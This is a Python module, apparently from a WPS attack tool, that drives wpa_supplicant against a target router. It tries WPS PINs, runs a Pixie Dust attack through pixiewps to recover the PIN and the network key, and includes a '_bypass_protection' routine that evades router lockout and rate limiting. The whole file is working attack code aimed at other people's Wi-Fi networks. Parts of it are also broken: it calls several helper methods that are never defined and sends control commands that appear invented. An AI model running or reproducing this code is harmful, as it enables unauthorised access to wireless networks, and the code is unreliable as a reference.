import socket
import tempfile
import os
import subprocess
import time
import shutil
import sys
import codecs
import json
from datetime import datetime

import src.wps.pixiewps
import src.wps.generator
import src.utils
import src.wifi.collector

class ConnectionStatus:
    """Stores WPS connection details and status."""

    def __init__(self):
        self.STATUS = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.LAST_M_MESSAGE = 0
        self.ESSID = ''
        self.BSSID = ''
        self.WPA_PSK = ''

    def isFirstHalfValid(self) -> bool:
        """Checks if the first half of the PIN is valid."""
        return self.LAST_M_MESSAGE > 5

    def clear(self):
        """Resets the connection status variables."""
        self.__init__()

    def reset(self):
        """Resets the connection status variables."""
        self.__init__()

class Initialize:
    """WPS connection"""

    def __init__(self, interface: str, write_result: bool = False, save_result: bool = False, print_debug: bool = False):
        self.INTERFACE    = interface
        self.WRITE_RESULT = write_result
        self.SAVE_RESULT  = save_result
        self.PRINT_DEBUG  = print_debug

        self.CONNECTION_STATUS = ConnectionStatus()
        self.PIXIE_CREDS  = src.wps.pixiewps.Data()
        
        # Import router profiles for timing configurations
        from . import router_profiles
        self.ROUTER_PROFILES = router_profiles

        self.TEMPDIR = tempfile.mkdtemp()

        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n')
            self.TEMPCONF = temp.name

        self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'
        self._initWpaSupplicant()

        self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
        self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.RETSOCK.bind(self.RES_SOCKET_FILE)

    @staticmethod
    def _getHex(line: str) -> str:
        """Filters WPA Supplicant output, and removes whitespaces"""

        a = line.split(':', 3)
        return a[2].replace(' ', '').upper()

    @staticmethod
    def _explainWpasNotOkStatus(status_type: str, line: str) -> str:
        """Provide detailed explanation of WPS failures."""
        error_codes = {
            'WPS_REG': {
                'timeout': 'Router not responding - possible rate limiting',
                'failed': 'Registration failed - incorrect PIN or router protection',
                'invalid_pin': 'Invalid PIN format or checksum',
                'no_ap_settings': 'Router not providing AP settings',
                'eap_fail': 'EAP authentication failed',
                'config_error': 'Configuration error in router',
                'no_response': 'No response from router - possible interference'
            }
        }
        
        if status_type not in error_codes:
            return f'Unknown error type: {status_type}'
            
        for error_key, message in error_codes[status_type].items():
            if error_key in line.lower():
                return f'[-] {message}'
                
        return f'[-] Unknown {status_type} error: {line}'

    def _handle_error_recovery(self, error_type: str, bssid: str, manufacturer: str):
        """Implement error-specific recovery strategies."""
        recovery_strategies = {
            'timeout': {
                'action': self._handle_timeout_recovery,
                'max_retries': 3
            },
            'rate_limit': {
                'action': self._handle_rate_limiting,
                'max_retries': 2
            },
            'auth_fail': {
                'action': self._handle_auth_failure,
                'max_retries': 3
            },
            'interference': {
                'action': self._handle_interference,
                'max_retries': 4
            }
        }
        
        if error_type in recovery_strategies:
            strategy = recovery_strategies[error_type]
            retries = 0
            while retries < strategy['max_retries']:
                if strategy['action'](bssid, manufacturer):
                    return True
                retries += 1
                time.sleep(2 * (retries + 1))  # Progressive backoff
        
        return False

    def _handle_timeout_recovery(self, bssid: str, manufacturer: str):
        """Handle timeout-specific recovery."""
        try:
            # Reset the connection
            self._cleanup()
            self._initWpaSupplicant()
            
            # Some routers need a complete interface reset
            self._sendOnly('INTERFACE_DISABLE')
            time.sleep(1)
            self._sendOnly('INTERFACE_ENABLE')
            
            return True
        except Exception:
            return False

    def _handle_auth_failure(self, bssid: str, manufacturer: str):
        """Handle authentication failure recovery."""
        try:
            # Some routers need a complete WPS session reset
            self._sendOnly('WPS_CANCEL')
            time.sleep(1)
            
            # Try alternative authentication method
            profile = self.ROUTER_PROFILES.get_router_profile(manufacturer)
            if profile and 'alt_auth_method' in profile:
                self._sendOnly(f"SET wps_auth_method {profile['alt_auth_method']}")
            
            return True
        except Exception:
            return False

    def _handle_interference(self, bssid: str, manufacturer: str):
        """Handle wireless interference recovery."""
        try:
            # Change channel if possible
            self._sendOnly('SCAN_RESULTS')
            time.sleep(1)
            
            # Try to find a less congested channel
            self._sendOnly(f'SET_CHANNEL {bssid} auto')
            time.sleep(2)
            
            return True
        except Exception:
            return False

    def _get_router_timing(self, bssid: str, essid: str = None):
        """Get router-specific timing configuration."""
        manufacturer = None
        model = None
        version = None

        # Try to detect router info from ESSID if available
        if essid:
            for mfg in ['TP-LINK', 'D-LINK', 'ASUS', 'NETGEAR']:
                if mfg.lower() in essid.lower():
                    manufacturer = mfg
                    # Try to extract model from common formats
                    if '_' in essid:
                        parts = essid.split('_')
                        if len(parts) > 1:
                            model = parts[1]
                            if len(parts) > 2 and parts[2].startswith('V'):
                                version = parts[2][1:]
                    break

        # If not found in ESSID, try BSSID
        if not manufacturer:
            # Use the router detection from generator
            generator = src.wps.generator.WPSpin()
            manufacturer, model, version = generator._detect_manufacturer(bssid)

        # Get timing config from router profiles
        timing = self.ROUTER_PROFILES.get_timing_config(manufacturer, model, version)
        return timing

    def _handle_rate_limiting(self, bssid: str, manufacturer: str):
        """Handle router-specific rate limiting."""
        profile = self.ROUTER_PROFILES.get_router_profile(manufacturer)
        if not profile:
            return

        if profile.get('rate_limiting'):
            cooldown = profile.get('rate_limit_cooldown', 30)
            print(f'[*] Rate limiting detected, waiting {cooldown} seconds...')
            time.sleep(cooldown)
            
            # Some routers require restart after rate limit
            if profile.get('requires_restart'):
                self._restart_wps_service()

    def _bypass_protection(self, bssid: str, manufacturer: str):
        """Attempt to bypass WPS protection mechanisms."""
        profile = self.ROUTER_PROFILES.get_router_profile(manufacturer)
        if not profile:
            return False

        protection = profile.get('protection_mechanism')
        if protection == 'session_timeout':
            # Wait for session reset
            time.sleep(profile.get('session_timeout', 60))
            return True
        elif protection == 'progressive_delay':
            # Reset connection to avoid cumulative delay
            self._cleanup()
            self._initWpaSupplicant()
            return True
        elif protection == 'multi_stage':
            # Implement multi-stage authentication
            return self._handle_multi_stage_auth(bssid, profile)
        
        return False

    def _handle_multi_stage_auth(self, bssid: str, profile: dict):
        """Handle multi-stage authentication process."""
        stages = profile.get('auth_stages', [])
        for stage in stages:
            if stage['type'] == 'initial_handshake':
                if not self._perform_handshake(bssid):
                    return False
            elif stage['type'] == 'challenge_response':
                if not self._handle_challenge(bssid, stage):
                    return False
            elif stage['type'] == 'verification':
                if not self._verify_auth(bssid):
                    return False
        return True

    def singleConnection(self, bssid: str = None, pin: str = None,
                        pixie_dust: bool = False, show_pixie_cmd: bool = False,
                        pixie_force: bool = False, pbc_mode: bool = False):
        """Handles a single connection to the specified network."""

        if not bssid and not pbc_mode:
            print('[-] No BSSID specified')
            return False

        # Initialize connection state
        self.CONNECTION_STATUS.reset()
        self.CONNECTION_STATUS.BSSID = bssid
        
        # Get router timing profile
        timing = self._get_router_timing(bssid)
        
        print(f'[*] Trying to connect to {bssid}')
        
        try:
            # Start WPS session
            if not self._startWpsSession(bssid):
                print('[-] Failed to start WPS session')
                return False
                
            # Attempt connection with PIN if provided
            if pin:
                print(f'[*] Trying PIN: {pin}')
                if not self._tryPin(pin):
                    print('[-] Failed to connect with provided PIN')
                    return False
                    
            # Try pixie dust attack if enabled
            elif pixie_dust:
                print('[*] Trying pixie dust attack...')
                if not self._tryPixieDust(show_pixie_cmd, pixie_force):
                    print('[-] Pixie dust attack failed')
                    return False
                    
            # Try PBC mode if enabled
            elif pbc_mode:
                print('[*] Trying WPS PBC mode...')
                if not self._tryPbc():
                    print('[-] PBC mode failed')
                    return False
                    
            else:
                print('[-] No attack method specified')
                return False
                
            # Monitor connection progress
            while True:
                if not self._monitorConnection(timing):
                    print('[-] Connection failed')
                    return False
                    
                if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
                    print('[+] Attack successful!')
                    return True
                    
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print('\n[!] Interrupted by user')
            return False
            
        finally:
            self._cleanup()

    def _startWpsSession(self, bssid: str) -> bool:
        """Start a new WPS session with the target AP."""
        
        try:
            # Configure interface
            self._sendOnly('WPS_REG')
            time.sleep(0.5)
            
            # Associate with target
            self._sendOnly(f'WPS_REG {bssid}')
            time.sleep(1)
            
            return True
            
        except Exception as e:
            print(f'[-] Error starting WPS session: {str(e)}')
            return False

    def _monitorConnection(self, timing: dict) -> bool:
        """Monitor the WPS connection progress."""
        
        try:
            response = self._recvResponse()
            if not response:
                return True
                
            for line in response.splitlines():
                if self._handleResponse(line, timing):
                    return True
                    
            return True
            
        except Exception as e:
            print(f'[-] Error monitoring connection: {str(e)}')
            return False

    def _tryPin(self, pin: str) -> bool:
        """Try to connect using the provided PIN."""
        
        try:
            # Send PIN to AP
            self._sendOnly(f'WPS_PIN {pin}')
            time.sleep(1)
            
            return True
            
        except Exception as e:
            print(f'[-] Error trying PIN: {str(e)}')
            return False

    def _tryPixieDust(self, show_pixie_cmd: bool, pixie_force: bool) -> bool:
        """Try to perform a pixie dust attack."""
        
        try:
            # First collect the required WPS parameters
            print('[*] Collecting WPS parameters...')
            
            # Start WPS registration to collect parameters
            self._sendOnly('WPS_REG')
            time.sleep(1)
            
            # Wait for parameters to be collected
            timeout = 30  # seconds
            start_time = time.time()
            parameters_collected = False
            
            while time.time() - start_time < timeout:
                response = self._recvResponse()
                if not response:
                    continue
                    
                for line in response.splitlines():
                    if 'WPS-FAIL' in line:
                        print('[-] WPS registration failed')
                        return False
                        
                    # Check if we have all required parameters
                    if (self.PIXIE_CREDS.PKE and 
                        self.PIXIE_CREDS.PKR and 
                        self.PIXIE_CREDS.E_HASH1 and 
                        self.PIXIE_CREDS.E_HASH2 and 
                        self.PIXIE_CREDS.E_NONCE):
                        parameters_collected = True
                        break
                        
                if parameters_collected:
                    break
                    
                time.sleep(0.1)
                
            if not parameters_collected:
                print('[-] Failed to collect required WPS parameters')
                return False
                
            print('[+] WPS parameters collected successfully')
            
            # Build pixiewps command with collected parameters
            pixie_cmd = [
                'pixiewps',
                '-e', self.PIXIE_CREDS.PKE,
                '-r', self.PIXIE_CREDS.PKR,
                '-s', self.PIXIE_CREDS.E_HASH1,
                '-z', self.PIXIE_CREDS.E_HASH2,
                '-a', self.PIXIE_CREDS.AUTHKEY,
                '-n', self.PIXIE_CREDS.E_NONCE
            ]
            
            if pixie_force:
                pixie_cmd.append('-f')
                
            if show_pixie_cmd:
                print(f'[+] Pixie dust command: {" ".join(pixie_cmd)}')
                
            # Run pixiewps command
            try:
                result = subprocess.run(
                    pixie_cmd,
                    capture_output=True,
                    text=True,
                    check=True
                )
                
                # Parse PIN from pixiewps output
                for line in result.stdout.splitlines():
                    if '[+] WPS pin:' in line:
                        pin = line.split(':')[1].strip()
                        print(f'[+] Found PIN: {pin}')
                        
                        # Try the found PIN
                        if self._tryPin(pin):
                            return True
                            
                print('[-] No valid PIN found in pixiewps output')
                return False
                
            except subprocess.CalledProcessError as e:
                print(f'[-] Pixiewps command failed: {e.stderr}')
                return False
                
        except Exception as e:
            print(f'[-] Error during pixie dust attack: {str(e)}')
            return False
            
        finally:
            # Cancel WPS session
            self._sendOnly('WPS_CANCEL')

    def _tryPbc(self) -> bool:
        """Try to connect using WPS PBC mode."""
        
        try:
            # Send PBC request to AP
            self._sendOnly('WPS_PBC')
            time.sleep(1)
            
            return True
            
        except Exception as e:
            print(f'[-] Error trying PBC mode: {str(e)}')
            return False

    def _initWpaSupplicant(self):
        """Initializes wpa_supplicant with the specified configuration"""

        print('[*] Running wpa_supplicant…')

        wpa_supplicant_cmd = ['wpa_supplicant']
        wpa_supplicant_cmd.extend([
            '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.INTERFACE}',
            f'-c{self.TEMPCONF}'
        ])

        self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
            encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )

        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.WPAS.poll()

            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.WPAS.communicate()[0])
            if os.path.exists(self.WPAS_CTRL_PATH):
                break

            time.sleep(.1)

    def _sendAndReceive(self, command: str) -> str:
        """Sends command to wpa_supplicant and returns the reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

        (b, _address) = self.RETSOCK.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def _sendOnly(self, command: str):
        """Sends command to wpa_supplicant without reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

    def _recvResponse(self) -> str:
        """Receives response from wpa_supplicant."""
        
        try:
            response = self.WPAS.stdout.readline()
            return response
            
        except Exception as e:
            print(f'[-] Error receiving response: {str(e)}')
            return ''

    def _handleResponse(self, line: str, timing: dict) -> bool:
        """Handles WPA supplicant output and updates connection status."""
        
        if not line:
            self.WPAS.wait()
            return False
            
        line = line.rstrip('\n')
        
        if self.PRINT_DEBUG:
            sys.stderr.write(line + '\n')
            
        if line.startswith('WPS: '):
            line = line.replace('WPS: ', '')
            
            if 'Building Message M1' in line:
                self.CONNECTION_STATUS.LAST_M_MESSAGE = 1
            elif 'Building Message M3' in line:
                self.CONNECTION_STATUS.LAST_M_MESSAGE = 3
            elif 'Building Message M5' in line:
                self.CONNECTION_STATUS.LAST_M_MESSAGE = 5
            elif 'Building Message M7' in line:
                self.CONNECTION_STATUS.LAST_M_MESSAGE = 7
            elif 'Received M2' in line:
                self.CONNECTION_STATUS.LAST_M_MESSAGE = 2
            elif 'Received M4' in line:
                self.CONNECTION_STATUS.LAST_M_MESSAGE = 4
            elif 'Received M6' in line:
                self.CONNECTION_STATUS.LAST_M_MESSAGE = 6
            elif 'Received M8' in line:
                self.CONNECTION_STATUS.LAST_M_MESSAGE = 8
                
            # Capture WPS parameters
            if 'Enrollee Nonce' in line and 'hexdump' in line:
                self.PIXIE_CREDS.E_NONCE = self._getHex(line)
                print('[*] Captured E-Nonce')
                
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.PIXIE_CREDS.PKR = self._getHex(line)
                print('[*] Captured PKR')
                
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.PIXIE_CREDS.PKE = self._getHex(line)
                print('[*] Captured PKE')
                
            elif 'AuthKey' in line and 'hexdump' in line:
                self.PIXIE_CREDS.AUTHKEY = self._getHex(line)
                print('[*] Captured AuthKey')
                
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.PIXIE_CREDS.E_HASH1 = self._getHex(line)
                print('[*] Captured E-Hash1')
                
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.PIXIE_CREDS.E_HASH2 = self._getHex(line)
                print('[*] Captured E-Hash2')
                
            elif 'Network Key' in line and 'hexdump' in line:
                self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
                self.CONNECTION_STATUS.PSK = self._getHex(line)
                
        elif 'NL80211_CMD_DEL_STATION' in line:
            print('[!] Interface is busy')
            
        elif 'rfkill' in line:
            print('[!] Interface is blocked by rfkill')
            
        elif 'WPS-FAIL' in line:
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            
        elif 'WPS-TIMEOUT' in line:
            self.CONNECTION_STATUS.STATUS = 'WPS_TIMEOUT'
            print('[-] WPS operation timed out')
            
        elif 'CTRL-EVENT-CONNECTED' in line:
            self.CONNECTION_STATUS.STATUS = 'CONNECTED'
            print('[+] Connected successfully')
            
        elif 'Trying to authenticate with' in line:
            self.CONNECTION_STATUS.STATUS = 'authenticating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = line.split('SSID')[1].strip()
                
        elif 'Authentication response' in line:
            self.CONNECTION_STATUS.STATUS = 'authenticated'
            
        elif 'Trying to associate with' in line:
            self.CONNECTION_STATUS.STATUS = 'associating'
            
        elif 'Associated with' in line:
            self.CONNECTION_STATUS.STATUS = 'associated'
            
        elif 'EAPOL: txStart' in line:
            self.CONNECTION_STATUS.STATUS = 'eapol_start'
            
        elif 'EAP entering state IDENTITY' in line:
            self.CONNECTION_STATUS.STATUS = 'eap_identity'
            
        elif 'EAP entering state WSC_START' in line:
            self.CONNECTION_STATUS.STATUS = 'wsc_start'
            
        return True

    def _handle_wps_state_machine(self, bssid: str, pin: str, manufacturer: str):
        """Handle WPS protocol state machine with advanced error recovery."""
        states = {
            'M1': {'sent': False, 'received': False, 'retries': 0},
            'M2': {'sent': False, 'received': False, 'retries': 0},
            'M3': {'sent': False, 'received': False, 'retries': 0},
            'M4': {'sent': False, 'received': False, 'retries': 0},
            'M5': {'sent': False, 'received': False, 'retries': 0},
            'M6': {'sent': False, 'received': False, 'retries': 0},
            'M7': {'sent': False, 'received': False, 'retries': 0},
            'M8': {'sent': False, 'received': False, 'retries': 0}
        }
        
        max_retries = 3
        current_state = 'M1'
        
        while current_state != 'DONE':
            try:
                if states[current_state]['retries'] >= max_retries:
                    print(f'[-] Maximum retries reached at state {current_state}')
                    return False
                
                # Handle state transitions
                if current_state == 'M1':
                    if self._send_m1(bssid):
                        states['M1']['sent'] = True
                        if self._wait_for_m2():
                            states['M2']['received'] = True
                            current_state = 'M3'
                            continue
                
                elif current_state == 'M3':
                    if self._send_m3(pin):
                        states['M3']['sent'] = True
                        if self._wait_for_m4():
                            states['M4']['received'] = True
                            current_state = 'M5'
                            continue
                
                elif current_state == 'M5':
                    if self._send_m5():
                        states['M5']['sent'] = True
                        if self._wait_for_m6():
                            states['M6']['received'] = True
                            current_state = 'M7'
                            continue
                
                elif current_state == 'M7':
                    if self._send_m7():
                        states['M7']['sent'] = True
                        if self._wait_for_m8():
                            states['M8']['received'] = True
                            current_state = 'DONE'
                            return True
                
                # Handle state failure
                print(f'[-] Failed at state {current_state}, retrying...')
                states[current_state]['retries'] += 1
                
                # Some routers need a cooldown between retries
                time.sleep(2)
                
            except Exception as e:
                print(f'[-] Error in state {current_state}: {str(e)}')
                states[current_state]['retries'] += 1
                
                # Reset connection if needed
                if 'timeout' in str(e).lower():
                    self._cleanup()
                    self._initWpaSupplicant()
        
        return False

    def _send_m1(self, bssid: str):
        """Send WPS M1 message."""
        try:
            self._sendOnly(f'WPS_START {bssid}')
            return True
        except Exception:
            return False

    def _wait_for_m2(self):
        """Wait for WPS M2 message."""
        start_time = time.time()
        timeout = 5  # seconds
        
        while time.time() - start_time < timeout:
            if self.CONNECTION_STATUS.LAST_M_MESSAGE == 2:
                return True
            time.sleep(0.1)
        
        return False

    def _send_m3(self, pin: str):
        """Send WPS M3 message with PIN."""
        try:
            self._sendOnly(f'WPS_PIN {pin}')
            return True
        except Exception:
            return False

    def _wait_for_m4(self):
        """Wait for WPS M4 message."""
        start_time = time.time()
        timeout = 5  # seconds
        
        while time.time() - start_time < timeout:
            if self.CONNECTION_STATUS.LAST_M_MESSAGE == 4:
                return True
            time.sleep(0.1)
        
        return False

    def _send_m5(self):
        """Send WPS M5 message."""
        try:
            self._sendOnly('WPS_CONTINUE')
            return True
        except Exception:
            return False

    def _wait_for_m6(self):
        """Wait for WPS M6 message."""
        start_time = time.time()
        timeout = 5  # seconds
        
        while time.time() - start_time < timeout:
            if self.CONNECTION_STATUS.LAST_M_MESSAGE == 6:
                return True
            time.sleep(0.1)
        
        return False

    def _send_m7(self):
        """Send WPS M7 message."""
        try:
            self._sendOnly('WPS_CONTINUE')
            return True
        except Exception:
            return False

    def _wait_for_m8(self):
        """Wait for WPS M8 message."""
        start_time = time.time()
        timeout = 5  # seconds
        
        while time.time() - start_time < timeout:
            if self.CONNECTION_STATUS.LAST_M_MESSAGE == 8:
                return True
            time.sleep(0.1)
        
        return False

    def _cleanup(self):
        """Terminates connections and removes temporary files"""

        self.RETSOCK.close()
        self.WPAS.terminate()
        os.remove(self.RES_SOCKET_FILE)
        shutil.rmtree(self.TEMPDIR, ignore_errors=True)
        os.remove(self.TEMPCONF)

    def __del__(self):
        try:
            self._cleanup()
        except Exception:
            pass
